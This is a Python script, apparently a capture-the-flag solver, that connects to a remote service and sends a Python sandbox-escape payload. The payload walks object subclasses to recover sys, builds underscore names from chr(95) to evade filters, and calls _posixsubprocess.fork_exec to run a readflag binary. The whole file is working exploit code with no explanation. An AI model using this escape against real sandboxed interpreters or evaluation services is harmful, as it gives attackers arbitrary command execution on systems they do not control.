#!/usr/bin/env python3

import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 11031

PAYLOAD = r'''
d = chr(95) * 2
subs = getattr(getattr(getattr((), d+"class"+d), d+"base"+d), d+"subclasses"+d)()
sm = None
for c in subs:
    try:
        g = getattr(getattr(c, d+"init"+d), d+"globals"+d)
        if "sys" in g:
            sm = g["sys"]
            break
    except Exception:
        pass
if sm is None:
    print("solver: could not locate sys via any subclass")
else:
    posix = sm.modules[chr(95) + "posixsubprocess"]
    osmod = sm.modules["os"]
    r, w = osmod.pipe()
    er, ew = osmod.pipe()
    fe = getattr(posix, "fork" + chr(95) + "exec")
    pid = fe(
        [b"/usr/local/bin/readflag"],
        [b"/usr/local/bin/readflag"],
        True, (), None, None,
        -1, -1, r, w, -1, -1,
        er, ew,
        False, False, -1, -1, None, -1, -1, None, False,
    )
    osmod.close(w)
    osmod.close(ew)
    data = b""
    while True:
        chunk = osmod.read(r, 4096)
        if not chunk: break
        data += chunk
    osmod.waitpid(pid, 0)
    print(data.decode("utf-8", errors="replace"))
'''


def main():
    s = socket.socket()
    s.settimeout(20)
    s.connect((HOST, PORT))
    banner = b""
    while b"----" not in banner:
        chunk = s.recv(4096)
        if not chunk: break
        banner += chunk
    sys.stderr.write(banner.decode("utf-8", "replace"))
    s.sendall(PAYLOAD.encode())
    s.shutdown(socket.SHUT_WR)
    out = b""
    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk: break
        out += chunk
    print(out.decode("utf-8", "replace"), end="")


if __name__ == "__main__":
    main()